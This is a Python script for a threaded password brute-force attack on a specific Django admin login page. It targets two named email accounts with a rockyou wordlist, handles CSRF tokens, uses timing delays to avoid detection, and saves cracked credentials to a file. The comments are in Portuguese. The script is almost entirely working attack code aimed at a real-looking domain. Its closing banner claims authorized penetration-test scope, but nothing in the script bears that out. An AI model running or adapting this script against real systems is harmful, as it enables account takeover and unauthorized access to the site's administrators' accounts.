#!/usr/bin/env python3
"""
Ultra-Aggressive Django Admin Bruteforce
Target: https://bkd.redahub.cloud/admin/login/
Validated Users: contato@redahub.cloud, tech@redahub.cloud
Wordlist: rockyou.txt (59K+ passwords)
Author: Neural-OffSec-Team
"""

import requests
import re
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# Configura√ß√µes
TARGET_URL = "https://bkd.redahub.cloud/admin/login/"
WORDLIST = "/tmp/rockyou-100k.txt"
VERIFIED_USERS = [
    "contato@redahub.cloud",  # Timing: 8.9% diff
    "tech@redahub.cloud",     # Timing: 12.1% diff
]
VERIFY_SSL = False
THREADS = 3  # Paralelo mas conservador (evitar rate limiting)
DELAY_BETWEEN_ATTEMPTS = 0.5  # segundos
MAX_ATTEMPTS = 10000  # Limite de seguran√ßa
RETRY_ON_FAIL = 2  # Retries para timeouts
SUCCESS_OUTPUT = "/tmp/bruteforce-success.txt"
PROGRESS_OUTPUT = "/tmp/bruteforce-progress.txt"


class UltraAggressiveBruteforcer:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = VERIFY_SSL
        self.attempts = 0
        self.found_credentials = []
        self.rate_limited = False
        self.banned = False
        self.start_time = datetime.now()

    def get_csrf_token(self) -> str:
        """Extrai CSRF token"""
        try:
            response = self.session.get(TARGET_URL, timeout=10)
            match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', response.text)
            return match.group(1) if match else None
        except Exception:
            return None

    def attempt_login(self, username: str, password: str) -> tuple:
        """Tenta login (thread-safe)"""
        self.attempts += 1
        attempt_num = self.attempts

        # Rate limiting check
        if self.rate_limited:
            time.sleep(10)  # Wait longer if rate limited
            self.rate_limited = False

        # CSRF token
        csrf_token = self.get_csrf_token()
        if not csrf_token:
            return False, "CSRF token falhou", attempt_num

        # Payload
        data = {
            "username": username,
            "password": password,
            "csrfmiddlewaretoken": csrf_token,
            "next": "/admin/",
        }

        headers = {
            "Referer": TARGET_URL,
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        }

        try:
            response = self.session.post(
                TARGET_URL,
                data=data,
                headers=headers,
                allow_redirects=False,
                timeout=10,
            )

            # An√°lise de resposta
            if response.status_code == 302:
                location = response.headers.get("Location", "")
                if "/admin/" in location and "/login" not in location:
                    return True, "‚úÖ LOGIN SUCESSO!", attempt_num

            if response.status_code == 429:
                self.rate_limited = True
                return False, "‚è±Ô∏è  RATE LIMIT (429)", attempt_num

            if response.status_code == 403:
                self.banned = True
                return False, "üö´ BANNED (403)", attempt_num

            if "bloqueado" in response.text.lower() or "locked" in response.text.lower():
                return False, "üîí CONTA BLOQUEADA", attempt_num

            if "muitas tentativas" in response.text.lower() or "too many" in response.text.lower():
                self.rate_limited = True
                return False, "‚è±Ô∏è  MUITAS TENTATIVAS", attempt_num

            # Falha normal
            return False, "‚ùå Inv√°lida", attempt_num

        except requests.Timeout:
            return False, "‚è±Ô∏è  Timeout", attempt_num
        except Exception as e:
            return False, f"‚ùå Erro: {str(e)[:20]}", attempt_num

    def save_success(self, username: str, password: str):
        """Salva credenciais v√°lidas"""
        with open(SUCCESS_OUTPUT, "a") as f:
            f.write(f"{datetime.now().isoformat()} | {username}:{password}\n")
        self.found_credentials.append((username, password))

    def save_progress(self, username: str, current: int, total: int):
        """Salva progresso"""
        elapsed = (datetime.now() - self.start_time).total_seconds()
        rate = current / elapsed if elapsed > 0 else 0
        eta = (total - current) / rate if rate > 0 else 0

        with open(PROGRESS_OUTPUT, "w") as f:
            f.write(f"User: {username}\n")
            f.write(f"Progress: {current}/{total} ({(current/total)*100:.1f}%)\n")
            f.write(f"Elapsed: {elapsed:.0f}s\n")
            f.write(f"Rate: {rate:.2f} attempts/s\n")
            f.write(f"ETA: {eta:.0f}s ({eta/60:.1f}min)\n")
            f.write(f"Attempts: {self.attempts}\n")
            f.write(f"Found: {len(self.found_credentials)}\n")

    def bruteforce_user(self, username: str, passwords: list):
        """Bruteforce para um usu√°rio"""
        print(f"\n[*] Iniciando bruteforce: {username}")
        print(f"[*] Senhas a testar: {len(passwords)}")
        print(f"[*] Threads: {THREADS}")
        print("-" * 70)

        total = len(passwords)
        tested = 0

        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = []

            for password in passwords:
                if self.banned:
                    print("\n[!] IP BANIDO. Abortando ataque.")
                    break

                if tested >= MAX_ATTEMPTS:
                    print(f"\n[!] Limite de {MAX_ATTEMPTS} tentativas atingido.")
                    break

                future = executor.submit(self.attempt_login, username, password)
                futures.append((future, password))
                tested += 1

                # Progress update a cada 100 tentativas
                if tested % 100 == 0:
                    self.save_progress(username, tested, total)
                    print(f"[{tested}/{total}] Progress: {(tested/total)*100:.1f}% | Found: {len(self.found_credentials)}")

                # Delay anti-detection
                time.sleep(DELAY_BETWEEN_ATTEMPTS / THREADS)

            # Coletar resultados
            for future, password in futures:
                try:
                    success, message, attempt_num = future.result(timeout=15)

                    if success:
                        print(f"\nüéØ [ATTEMPT {attempt_num}] CREDENCIAL V√ÅLIDA ENCONTRADA!")
                        print(f"    Username: {username}")
                        print(f"    Password: {password}")
                        print(f"    Time: {datetime.now().isoformat()}")
                        self.save_success(username, password)
                        # Continuar testando para encontrar mais senhas v√°lidas

                except Exception as e:
                    print(f"[-] Thread error: {e}")

        # Final progress
        self.save_progress(username, tested, total)

    def run(self):
        """Executa bruteforce em todos os usu√°rios"""
        print("=" * 70)
        print("[*] ULTRA-AGGRESSIVE BRUTEFORCE - Django Admin")
        print("=" * 70)
        print(f"[*] Target: {TARGET_URL}")
        print(f"[*] Wordlist: {WORDLIST}")
        print(f"[*] Users: {len(VERIFIED_USERS)}")
        print(f"[*] Max attempts per user: {MAX_ATTEMPTS}")
        print(f"[*] Threads: {THREADS}")
        print(f"[*] Delay: {DELAY_BETWEEN_ATTEMPTS}s")
        print(f"[*] Start time: {self.start_time.isoformat()}")
        print("=" * 70)

        # Carregar passwords
        try:
            with open(WORDLIST, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"[+] {len(passwords)} senhas carregadas")
        except Exception as e:
            print(f"[-] Erro ao carregar wordlist: {e}")
            return

        # Bruteforce cada usu√°rio
        for username in VERIFIED_USERS:
            self.bruteforce_user(username, passwords[:MAX_ATTEMPTS])

            if self.banned:
                print("\n[!] IP BANIDO. Imposs√≠vel continuar.")
                break

        # Relat√≥rio final
        print("\n" + "=" * 70)
        print("[*] RELAT√ìRIO FINAL")
        print("=" * 70)
        print(f"Tempo total: {(datetime.now() - self.start_time).total_seconds():.0f}s")
        print(f"Total de tentativas: {self.attempts}")
        print(f"Credenciais encontradas: {len(self.found_credentials)}")

        if self.found_credentials:
            print("\nüîì CREDENCIAIS V√ÅLIDAS:")
            for username, password in self.found_credentials:
                print(f"  ‚úÖ {username}:{password}")
            print(f"\n[+] Salvo em: {SUCCESS_OUTPUT}")
        else:
            print("\n‚ùå Nenhuma credencial v√°lida encontrada.")
            print("\n[+] Poss√≠veis raz√µes:")
            print("    1. Senhas n√£o est√£o no rockyou.txt")
            print("    2. Rate limiting bloqueou ataque")
            print("    3. IP foi banido")
            print("    4. Usu√°rios t√™m senhas fortes (>12 chars, complexas)")
            print("    5. 2FA habilitado no Django Admin")

        print(f"\n[+] Progresso salvo em: {PROGRESS_OUTPUT}")


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    print("\n‚ö†Ô∏è  ATEN√á√ÉO: Este √© um ataque AGRESSIVO.")
    print("‚ö†Ô∏è  Uso autorizado apenas com carta de autoriza√ß√£o v√°lida.")
    print("‚ö†Ô∏è  CNPJ: 11.254.658/0001-63 | Per√≠odo: 06/11/2025 - 15/11/2025")
    print("")

    bruteforcer = UltraAggressiveBruteforcer()
    bruteforcer.run()
